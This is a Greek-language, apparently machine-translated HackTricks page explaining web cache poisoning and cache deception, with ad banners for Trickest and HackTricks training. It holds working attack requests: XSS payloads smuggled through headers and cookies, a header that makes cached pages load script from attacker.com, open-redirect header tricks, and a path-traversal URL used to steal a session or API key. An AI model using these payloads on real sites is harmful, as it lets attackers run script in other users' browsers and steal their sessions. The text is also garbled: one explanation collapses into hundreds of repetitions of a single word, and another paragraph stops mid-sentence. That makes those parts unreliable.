# Ατροποποίηση Προσωρινής Μνήμης και Απάτη Προσωρινής Μνήμης

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Η διαφορά

> **Ποια είναι η διαφορά μεταξύ ατροποποίησης προσωρινής μνήμης ιστού και απάτης προσωρινής μνήμης ιστού;**
>
> * Στην **ατροποποίηση προσωρινής μνήμης ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο κακόβουλο περιεχόμενο στη μνήμη cache, και αυτό το περιεχόμενο εξυπηρετείται από τη μνήμη cache σε άλλους χρήστες της εφαρμογής.
> * Στην **απάτη προσωρινής μνήμης ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο ευαίσθητο περιεχόμενο που ανήκει σε άλλο χρήστη στη μνήμη cache, και στη συνέχεια ο επιτιθέμενος ανακτά αυτό το περιεχόμενο από τη μνήμη cache.

## Ατροποποίηση Προσωρινής Μνήμης

Η ατροποποίηση προσωρινής μνήμης στοχεύει στην παραπλάνηση της μνήμης του πελάτη για να αναγκάσει τους πελάτες να φορτώσουν πόρους που είναι απροσδόκητοι, μερικοί ή υπό τον έλεγχο ενός επιτιθέμενου. Η έκταση της επίδρασης εξαρτάται από τη δημοτικότητα της επηρεασμένης σελίδας, καθώς η μολυσμένη απάντηση εξυπηρετείται αποκλειστικά σε χρήστες που επισκέπτονται τη σελίδα κατά την περίοδο μόλυνσης της μνήμης cache.

Η εκτέλεση μιας επίθεσης ατροποποίησης προσωρινής μνήμης περιλαμβάνει αρκετά βήματα:

1. **Αναγνώριση Μη-Κλειδωμένων Εισόδων**: Αυτά είναι παράμετροι που, αν και δεν απαιτούνται για να αποθηκευτεί μια αίτηση, μπορεί να τροποποιήσουν την απάντηση που επιστρέφεται από τον διακομιστή. Η αναγνώριση αυτών των εισόδων είναι κρίσιμη καθώς μπορούν να εκμεταλλευτούν για την ατροποποίηση της μνήμης cache.
2. **Εκμετάλλευση των Μη-Κλειδωμένων Εισόδων**: Μετά την αναγνώριση των μη-κλειδωμένων εισόδων, το επόμενο βήμα είναι να καταλάβετε πώς να εκμεταλλευτείτε αυτές τις παραμέτρους για να τροποποιήσετε την απάντηση του διακομιστή με έναν τρόπο που εξυπηρετεί τον επιτιθέμενο.
3. **Βεβαίωση ότι η Ατροποποιημένη Απάντηση Αποθηκεύεται**: Το τελευταίο βήμα είναι να βεβαιωθείτε ότι η τροποποιημένη απάντηση αποθηκεύεται στη μνήμη cache. Με αυτόν τον τρόπο, οποιοσδήποτε χρήστης έχει πρόσβαση στην επηρεασμένη σελίδα κατά την περίοδο της μόλυνσης της μνήμης cache θα λάβει τη μολυσμένη απάντηση.

### Ανακάλυψη: Έλεγχος κεφαλίδων HTTP

Συνήθως, όταν μια απάντηση ήταν **αποθηκευμένη στη μνήμη cache** θα υπάρχει ένα **κεφάλι που το υποδεικνύει**, μπορείτε να ελέγξετε ποια κεφάλια πρέπει να προσέξετε σε αυτήν την ανάρτηση: [**Κεφαλίδες Αποθήκευσης HTTP**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Ανακάλυψη: Κωδικοί σφαλμάτων αποθήκευσης

Αν υποψιάζεστε ότι η απάντηση αποθηκεύεται σε μνήμη cache, θα μπορούσατε να **στείλετε αιτήσεις με ένα κακό κεφάλι**, το οποίο θα έπρεπε να απαντηθεί με ένα **κωδικό κατάστασης 400**. Στη συνέχεια δοκιμάστε να έχετε πρόσβαση στο αίτημα κανονικά και αν η **απάντηση είναι κωδικός κατάστασης 400**, ξέρετε ότι είναι ευάλωτο (και μπορείτε ακόμη να πραγματοποιήσετε ένα DoS).

Μπορείτε να βρείτε περισσότερες επιλογές στο:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Ωστόσο, σημειώστε ότι **μερικές φορές αυτού του είδους οι κωδικοί κατάστασης δεν αποθηκεύονται** έτσι αυτό το τεστ δεν θα μπορούσε να είναι αξιόπιστο. 

### Ανακάλυψη: Αναγνώριση και αξιολόγηση μη-κλειδωμένων εισόδων

Μπορείτε να χρησιμοποιήσετε το [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) για να **δοκιμάσετε με βία παραμέτρους και κεφαλίδες** που μπορεί να **αλλάζουν την απάντηση της σελίδας**. Για παράδειγμα, μια σελίδα μπορεί να χρησιμοποιεί το κεφάλι `X-Forwarded-For` για να υποδείξει στον πελάτη να φορτώσει το σενάριο από εκεί:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Εξαγωγή επιβλαβούς απάντησης από τον διακομιστή πίσω από τον διακομιστή

Με την παράμετρο/κεφαλίδα που εντοπίσατε, ελέγξτε πώς γίνεται η **απολύμανση** και **πού** επηρεάζει την απόκριση από την κεφαλίδα. Μπορείτε να το καταχραστείτε με οποιονδήποτε τρόπο (να εκτελέσετε ένα XSS ή να φορτώσετε έναν κώδικα JS που ελέγχετε εσείς; να πραγματοποιήσετε ένα DoS;...)

### Λήψη της αποθηκευμένης απόκρισης

Αφού έχετε **εντοπίσει** τη **σελίδα** που μπορεί να καταχραστεί, ποια **παράμετρος**/**κεφαλίδα** να χρησιμοποιήσετε και **πώς** να το **καταχραστείτε**, πρέπει να λάβετε την αποθηκευμένη σελίδα. Ανάλογα με τον πόρο που προσπαθείτε να λάβετε από την μνήμη cache, αυτό μπορεί να πάρει κάποιο χρόνο, μπορεί να χρειαστεί να προσπαθήσετε για μερικά δευτερόλεπτα.\
Η κεφαλίδα **`X-Cache`** στην απόκριση μπορεί να είναι πολύ χρήσιμη καθώς μπορεί να έχει την τιμή **`miss`** όταν το αίτημα δεν ήταν αποθηκευμένο και την τιμή **`hit`** όταν είναι αποθηκευμένο.\
Η κεφαλίδα **`Cache-Control`** είναι επίσης ενδιαφέρουσα για να γνωρίζετε αν ένας πόρος αποθηκεύεται και πότε θα αποθηκευτεί ξανά ο πόρος: `Cache-Control: public, max-age=1800`\
Μια άλλη ενδιαφέρουσα κεφαλίδα είναι το **`Vary`**. Αυτή η κεφαλίδα χρησιμοποιείται συχνά για να **υποδεικνύει επιπλέον κεφαλίδες** που θεωρούνται **μέρος του κλειδιού της μνήμης cache** ακόμη κι αν συνήθως δεν είναι κλειδωμένες. Επομένως, αν ο χρήστης γνωρίζει το `User-Agent` του θύματος που στοχεύει, μπορεί να δηλητηριάσει τη μνήμη cache για τους χρήστες που χρησιμοποιούν αυτό το συγκεκριμένο `User-Agent`.\
Μια ακόμη κεφαλίδα που σχετίζεται με τη μνήμη cache είναι το **`Age`**. Ορίζει το χρόνο σε δευτερόλεπτα που το αντικείμενο έχει παραμείνει στη μνήμη cache του διακομιστή proxy.

Όταν αποθηκεύετε ένα αίτημα, **προσέξτε τις κεφαλίδες που χρησιμοποιείτε** επειδή κάποιες από αυτές θα μπορούσαν να χρησιμοποιηθούν απροσδόκητα ως κλειδιά και ο **θύμα θα πρέπει να χρησιμοποιήσει αυτήν την ίδια κεφαλίδα**. Δοκιμάστε πάντα τη Δηλητηρίαση της Μνήμης Cache με **διαφορετικούς περιηγητές** για να ελέγξετε αν λειτουργεί.

## Παραδείγματα Εκμετάλλευσης

### Ευκολότερο παράδειγμα

Μια κεφαλίδα όπως το `X-Forwarded-For` αντικατοπτρίζεται στην απόκριση χωρίς απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτως απολύτω
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note ότι αυτό θα δημιουργήσει μια δηλητηριασμένη αίτηση προς το `/en?region=uk` και όχι προς το `/en`_

### Δηλητηρίαση cache για DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Χρήση δηλητηρίασης cache στο web για εκμετάλλευση ευπαθειών στην χειριστική των cookies

Τα cookies θα μπορούσαν επίσης να αντανακλώνται στην απόκριση μιας σελίδας. Αν μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε ένα XSS για παράδειγμα, θα μπορούσατε να εκμεταλλευτείτε το XSS σε αρκετούς πελάτες που φορτώνουν την κακόβουλη απόκριση της cache.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Σημειώστε ότι εάν το ευάλωτο cookie χρησιμοποιείται συχνά από τους χρήστες, οι τακτικές αιτήσεις θα καθαρίζουν τη μνήμη cache.

### Δηλητηρίαση cache με διάβαση διαδρομής για να κλέψετε το κλειδί API <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Αυτή η ανάλυση εξηγεί**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) πώς ήταν δυνατόν να κλαπεί ένα κλειδί API της OpenAI με ένα URL όπως `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` επειδή οτιδήποτε ταιριάζει με `/share/*` θα αποθηκεύεται στην cache χωρίς η Cloudflare να κανονικοποιεί το URL, το οποίο έγινε όταν το αίτημα έφτασε στον web server.

### Χρήση πολλαπλών κεφαλίδων για την εκμετάλλευση ευπάθειών δηλητηρίασης cache στο web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Μερικές φορές θα χρειαστεί να **εκμεταλλευτείτε αρκετές μη-κλειδωμένες εισόδους** για να μπορέσετε να καταχραστείτε μια cache. Για παράδειγμα, μπορείτε να βρείτε ένα **Ανοικτό ανακατευθύνση** αν ορίσετε το `X-Forwarded-Host` σε έναν τομέα που ελέγχετε εσείς και το `X-Forwarded-Scheme` σε `http`. **Αν** ο **διακομιστής** ανακατεύει όλα τα **HTTP** αιτήματα **σε HTTPS** και χρησιμοποιεί την κεφαλίδα `X-Forwarded-Scheme` ως το όνομα τομέα για την ανακατεύθυνση, μπορείτε να ελέγξετε προς πού θα οδηγηθεί η σελίδα με την ανακατεύθυνση.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Εκμετάλλευση με περιορισμένο `Vary` header

Αν ανακαλύψετε ότι το **`X-Host`** header χρησιμοποιείται ως **όνομα domain για τη φόρτωση ενός πόρου JS** αλλά το **`Vary`** header στην απόκριση υποδεικνύει **`User-Agent`**. Τότε, πρέπει να βρείτε έναν τρόπο να εξαγάγετε το User-Agent του θύματος και να δηλητηριάσετε τη μνήμη cache χρησιμοποιώντας αυτό το user agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Παχύ Get

Στείλτε ένα αίτημα GET με το αίτημα τόσο στο URL όσο και στο σώμα. Εάν ο διακομιστής web χρησιμοποιεί αυτό από το σώμα αλλά ο διακομιστής cache κρατάει αυτό από το URL, οποιοσδήποτε προσπελαύνει αυτό το URL θα χρησιμοποιήσει πραγματικά την παράμετρο από το σώμα. Όπως η ευπάθεια που ανέκρινε ο James Kettle στην ιστοσελίδα του Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Απόκρυψη Παραμέτρων

Για παράδειγμα, είναι δυνατόν να χωρίσετε τις **παραμέτρους** σε διακομιστές ruby χρησιμοποιώντας τον χαρακτήρα **`;`** αντί για το **`&`**. Αυτό μπορεί να χρησιμοποιηθεί για να τοποθετήσετε τιμές παραμέτρων χωρίς κλειδί μέσα σε κλειδωμένες και να τις καταχραστείτε.

Εργαστήριο Portswigger: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Εκμεταλλευόμενοι την Ατζέντηση Κρυπτογράφησης Κρυφής Μνήμης HTTP με την Κατάχρηση της Αιτήσεως HTTP Request Smuggling

Μάθετε εδώ πώς να εκτελέσετε επιθέσεις Κρυφής Μνήμης Προσωρινής Αποθήκευσης με την κατάχρηση της Αιτήσεως HTTP Request Smuggling.

### Αυτοματοποιημένος Έλεγχος για Κρυφή Μνήμη Ιστού

Το [Εργαλείο Ευπαθειών Κρυφής Μνήμης Ιστού](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) μπορεί να χρησιμοποιηθεί για τον αυτόματο έλεγχο της κρυφής μνήμης ιστού. Υποστηρίζει πολλές διαφορετικές τεχνικές και είναι υψηλά προσαρμόσιμο.

Παράδειγμα χρήσης: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Ευάλωτα Παραδείγματα

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

Ο ATS προώθησε το κομμάτι μέσα στο URL χωρίς να το αφαιρέσει και δημιούργησε το κλειδί της μνήμης μόνο χρησιμοποιώντας τον κεντρικό υπολογιστή, τη διαδρομή και το ερώτημα (αγνοώντας το κομμάτι). Έτσι, το αίτημα `/#/../?r=javascript:alert(1)` στάλθηκε στον πίσω υπολογιστή ως `/#/../?r=javascript:alert(1)` και το κλειδί της μνήμης δεν είχε το φορτίο μέσα του, μόνο τον κεντρικό υπολογιστή, τη διαδρομή και το ερώτημα.

### GitHub CP-DoS

Η αποστολή μιας κακής τιμής στην κεφαλίδα content-type προκάλεσε μια αποθηκευμένη απάντηση 405. Το κλειδί της μνήμης περιείχε το cookie, οπότε ήταν δυνατό να επιτεθεί μόνο σε μη εξουσιοδοτημένους χρήστες.

### GitLab + GCP CP-DoS

Το GitLab χρησιμοποιεί κάδους GCP για την αποθήκευση στατικού περιεχομένου. Οι **Κάδοι GCP** υποστηρίζουν την **κεφαλίδα `x-http-method-override`**. Έτσι, ήταν δυνατό να σταλεί η κεφαλίδα `x-http-method-override: HEAD` και να δηλητηριάσει τη μνήμη προσωρινής αποθήκευσης ώστε να επιστρέψει ένα κενό σώμα απάντησης. Μπορούσε επίσης να υποστηρίξει τη μέθοδο `PURGE`.

### Rack Middleware (Ruby on Rails)

Στις εφαρμογές Ruby on Rails, συχνά χρησιμοποιείται το Rack middleware. Ο σκοπός του κώδικα Rack είναι να πάρει την τιμή της κεφαλίδας **`x-forwarded-scheme`** και να την ορίσει ως το σχήμα του αιτήματος. Όταν στέλνεται η κεφαλίδα `x-forwarded-scheme: http`, συμβαίνει μια ανακατεύθυνση 301 στην ίδια τοποθεσία, προκαλώντας πιθανώς έναν Αποκλεισμό των Υπηρεσιών (DoS) σε αυτό το πόρισμα. Επιπλέον, η εφαρμογή ενδέχεται να αναγνωρίσει την κεφαλίδα `X-forwarded-host` και να ανακατευθύνει τους χρήστες στο καθορισμένο κεντρικό υπολογιστή. Αυτή η συμπεριφορά μπορεί να οδηγήσει στη φόρτωση αρχείων JavaScript από τον διακομιστή ενός επιτιθέμενου, δημιουργώντας έναν κίνδυνο ασφάλειας.

### 403 και Κάδοι Αποθήκευσης

Η Cloudflare προηγουμένως αποθήκευε απαντήσεις 403. Η προσπάθεια πρόσβασης σε S3 ή Azure Storage Blobs με εσφαλμένες κεφαλίδες Εξουσιοδότησης θα οδηγούσε σε μια απάντηση 403 που θα αποθηκευόταν. Αν και η Cloudflare έχει σταματήσει την αποθήκευση απαντήσεων 403, αυτή η συμπεριφορά ενδέχεται να εξακολουθεί να υπάρχει σε άλλες υπηρεσίες διακομιστή.

### Ενσωμάτωση Κλειδωμένων Παραμέτρων

Οι μνήμες συχνά περιλαμβάνουν συγκεκριμένες παραμέτρους GET στο κλειδί της μνήμης. Για παράδειγμα, το Varnish της Fastly αποθήκευε την παράμετρο `size` στα αιτήματα. Ωστόσο, αν στάλθηκε επίσης μια εκδοχή κωδικοποιημένη με URL της παραμέτρου (π.χ., `siz%65`) με μια εσφαλμένη τιμή, το κλειδί της μνήμης θα κατασκευαζόταν χρησιμοποιώντας τη σωστή παράμετρο `size`. Ωστόσο, ο πίσω υπολογιστής θα επεξεργαζόταν την τιμή στην παράμετρο κωδικοποιημένη με URL. Η κωδικοποίηση με URL της δεύτερης παραμέτρου `size` οδήγησε στην παράλειψή της από τη μνήμη αλλά στη χρήση της από τον πίσω υπολογιστή. Η ανάθεση μιας τιμής 0 σε αυτήν την παράμετρο οδήγησε σε ένα cacheable σφάλμα 400 Bad Request.

### Κανόνες Πράκτορα Χρήστη

Ορισμένοι προγραμματιστές αποκλείουν αιτήσεις με πράκτορες χρήστη που ταιριάζουν με αυτούς των εργαλείων υψηλής κίνησης όπως το FFUF ή το Nuclei για τη διαχείριση του φορτίου του διακομιστή. Παράδοξα, αυτή η προσέγγιση μπορεί να εισάγει ευπάθειες όπως η κατάχρηση της μνήμης cache και ο DoS.

### Παράνομα Πεδία Κεφαλίδων

Το [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) καθορίζει τους αποδεκτούς χαρακτήρες στα ονόματα των κεφαλίδων. Οι κεφαλίδες που περιέχουν χαρακτήρες εκτός του καθορισμένου εύρους **tchar** θα έπρεπε ιδανικά να προκαλούν μια απάντηση 400 Bad Request. Στην πράξη, οι διακομιστές δεν πάντα τηρούν αυτό το πρότυπο. Ένα ενδεικτικό παράδειγμα είναι η Akamai, η οποία προωθεί κεφαλίδες με μη έγκυρους χαρακτήρες και αποθηκεύει οποιοδήποτε σφάλμα 400, όσο το `cache-control` header δεν είναι παρόν. Αναγνωρίστηκε ένα εκμεταλλεύσιμο πρότυπο όπου η αποστολή μιας κεφαλίδας με έναν παράνομο χαρακτήρα, όπως `\`, θα οδηγούσε σε ένα
## Αυτόματα Εργαλεία

* [**toxicache**](https://github.com/xhzeem/toxicache): Σαρωτής σε Golang για την εντοπισμό ευπαθειών δηλητηρίασης της cache σε ιστοσελίδες σε μια λίστα διευθύνσεων URL και δοκιμή πολλαπλών τεχνικών εισαγωγής.

## Αναφορές

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
